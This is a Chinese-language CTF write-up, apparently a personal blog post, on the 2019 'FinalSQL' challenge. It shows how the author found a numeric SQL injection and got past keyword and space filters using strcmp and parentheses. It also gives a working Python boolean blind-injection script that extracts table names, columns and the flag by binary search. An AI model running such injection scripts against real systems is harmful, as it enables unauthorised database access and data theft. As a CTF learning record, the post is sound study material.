---
title: 极客大挑战 2019 FinalSQL
date: 2021-04-18 19:11:51
categories:  ['CTF']
tags: ['sql注入']
cover: https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201120232228.png
---

还是同一场比赛的界面

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416224503.png)

这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：**你可别被我逮住了，臭弟弟**，测试上面的序号，注意此时的url中有`?id=`猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个**数字型**注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。

发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。

贴出来自己的脚本：

```python
# codeing=utf-8
import requests
import time

url='http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id='
result=''

for x in range(1, 100):
	high = 127
	low = 32
	mid = (low + high) // 2
	while high>low:
		# sql="(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)"%(i,c)
		# sql = "(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)" % (x, mid)
		sql = "(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))>%d)" % (x, mid)
		time.sleep(0.1)
		reponse=requests.get(url+sql)
		if "Click" in reponse.text:
			low=mid+1
		else:
			high = mid
		mid = (low+high)/2

	result += chr(int(mid))
	print(result)

```

我是直接使用了判断字符的返回值1或0作为id的参数，因为使用**group_concat**拼接时字符串有逗号`,`所以字符ascii需要至少从44开始。

下面是查询到的两个表F1naI1y 、Flaaaaag及结构

> F1naI1y  ====>  id,username,password
>
> Flaaaaag  ====> id,fl4gawsl

在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag

